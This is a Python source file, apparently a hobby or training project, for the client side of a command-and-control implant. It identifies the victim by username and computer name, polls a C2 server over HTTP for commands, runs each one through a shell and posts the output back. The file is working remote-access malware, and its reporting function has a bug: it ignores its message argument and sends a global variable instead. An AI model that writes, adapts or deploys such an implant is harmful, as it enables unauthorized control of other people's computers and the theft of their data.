"""
Command & Control Client Side Coding
Author: Davood Yakuza
"""

# Import for Linux Builds only
#from os import getenv, uname, chdir, path,

# Import for both Linux & Windows Builds
from requests import get, exceptions, post
from time import time, sleep
from subprocess import run, PIPE, STDOUT

# Custom Features Import
from colorama import Fore

# Import for Windows Builds only
from os import getenv, chdir, path

# Constants Import
from settings import PORT, CMD_REQUEST, RESPONSE_PATH, RESPONSE_KEY, C2_SERVER, DELAY, PROXY, HEADERS


# For Windows obtain a unique identifying Information
client = getenv("USERNAME","Unknown-Username") + "@" + getenv("COMPUTERNAME","Unknown-Computer Name") + "@" + str(time())

# For Linux, get a unique identifying Information
#client = getenv("LOGNAME","Unknown-Username") + "@" + uname().nodename + "@" + str(time())

# Print C2 Client Side Message for avoid complexing in test operation
print(Fore.LIGHTMAGENTA_EX+"[+]-------------C2 Client Side-------------[+]"+Fore.RESET)

def post_to_server(message, response_path=RESPONSE_PATH):
    """function to post data to C2 Server, accept message and response path
	optional as arguments"""
    try:
        post(f"http://{C2_SERVER}:{PORT}{RESPONSE_PATH}",
             data={RESPONSE_KEY:commandOutput.stdout},
             headers=HEADERS, proxies=PROXY)
    except exceptions.RequestException:
        return


#Better use infinity loop when add control active sessions feature in Server Side
while True: #while True:
    '''Try an http get requests to the C2 Server and retrieve command;
	if failed, Keep Trying forever.'''
    try:
        response = get(f"http://{C2_SERVER}:{PORT}{CMD_REQUEST}{client}", headers=HEADERS, proxies=PROXY)
    except exceptions.RequestException:
        print(Fore.LIGHTRED_EX+"[-] C2 Server is down, try Reconnecting..."+Fore.RESET)
        try:
            sleep(DELAY)
            continue #jump to the last iteration of the loop(while True:)
        except KeyboardInterrupt:
            print(Fore.LIGHTMAGENTA_EX+"[*] User has been Interrupted the C2 Client Side"+Fore.RESET)
            break
    except KeyboardInterrupt:
        print(Fore.LIGHTMAGENTA_EX+"[*] User has been Interrupted the C2 Client Side"+Fore.RESET)
        break
    except Exception as e:
        print(Fore.LIGHTYELLOW_EX+"[!] Unknown Error when Sending Request to C2 Server"+Fore.RESET)
        print(f'Error Content: {e}')
        break

    # Retrieve the command from response and decode it 
    command = response.content.decode()

    # Check if the command is cd without any input path, change to home directory
    if len(command) == 2 and command == "cd":
        homeDirectory = path.expanduser("~")
        chdir(homeDirectory)

    # if the Command is cd follow below blocks, first check cd with an input path
    if command.startswith("cd "):
        directory = command[3:]

        try:
            chdir(directory)
        except FileNotFoundError:
            post_to_server(f"No such directory {directory}.\n")
        except NotADirectoryError:
            post_to_server(f"{directory} is not a directory")
        except PermissionError:
            post_to_server(f"You have don't Permission to Access{directory}.\n")
        except OSError:
            post_to_server("There was a Operation System Error on client.\n")

    # if the Command is cd without any input path, change to home directory
    # if command == "cd":
    #     system("cd")

    # Run command using subprocess.run module
    commandOutput = run(command, shell=True, stdout=PIPE, stderr=STDOUT)
    
    post_to_server(commandOutput.stdout)
    print("[+] Command Executed and Result send to C2 Server.")
    

    print(Fore.LIGHTBLUE_EX+str(response.status_code)+Fore.RESET)
    

print(Fore.LIGHTCYAN_EX+f"[+] Goodbye & Goodluck Ninja 🥷\n{client}"+Fore.RESET)



